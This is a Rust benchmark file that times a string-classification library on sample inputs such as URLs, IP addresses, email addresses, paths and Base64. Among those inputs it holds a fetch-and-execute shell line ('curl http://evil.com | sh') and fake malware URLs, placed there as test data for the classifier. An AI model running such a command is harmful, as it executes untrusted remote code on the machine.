//! Benchmarks for string classification.
//!
//! Run with: cargo bench -p stng

use criterion::{black_box, criterion_group, criterion_main, Criterion};

fn bench_classify(c: &mut Criterion) {
    let mut g = c.benchmark_group("classify_string");

    // Fast path: very short strings
    g.bench_function("short_const", |b| {
        b.iter(|| stng::classify_string(black_box("ab")))
    });

    // Common case: plain constant
    g.bench_function("const", |b| {
        b.iter(|| stng::classify_string(black_box("Hello World")))
    });

    // URL detection
    g.bench_function("url", |b| {
        b.iter(|| stng::classify_string(black_box("https://malware.example.com/payload.exe")))
    });

    // IP address
    g.bench_function("ip", |b| {
        b.iter(|| stng::classify_string(black_box("192.168.1.1")))
    });

    // IP that's actually a version string (false positive check)
    g.bench_function("version_not_ip", |b| {
        b.iter(|| stng::classify_string(black_box("Chrome/100.0.0.0")))
    });

    // Email
    g.bench_function("email", |b| {
        b.iter(|| stng::classify_string(black_box("ransom@evil.onion")))
    });

    // File path
    g.bench_function("path", |b| {
        b.iter(|| stng::classify_string(black_box("/usr/bin/bash")))
    });

    // Shell command
    g.bench_function("shell_cmd", |b| {
        b.iter(|| stng::classify_string(black_box("curl http://evil.com | sh")))
    });

    // Base64
    g.bench_function("base64", |b| {
        b.iter(|| stng::classify_string(black_box("SGVsbG8gV29ybGQhIFRoaXMgaXMgYSB0ZXN0")))
    });

    // Environment variable
    g.bench_function("env_var", |b| {
        b.iter(|| stng::classify_string(black_box("COLUMNS")))
    });

    // Long unclassifiable string (>1000 chars, prefix scan finds nothing)
    let long_plain = "A".repeat(1500);
    g.bench_function("long_unclassified", |b| {
        b.iter(|| stng::classify_string(black_box(&long_plain)))
    });

    // Long URL (>1000 chars, prefix scan catches it)
    let long_url = format!("https://evil.com/{}", "x".repeat(1500));
    g.bench_function("long_url", |b| {
        b.iter(|| stng::classify_string(black_box(&long_url)))
    });

    // Long path (>1000 chars, prefix scan catches it)
    let long_path = format!("/usr/local/bin/{}", "a/".repeat(500));
    g.bench_function("long_path", |b| {
        b.iter(|| stng::classify_string(black_box(&long_path)))
    });

    g.finish();
}

criterion_group!(benches, bench_classify);
criterion_main!(benches);
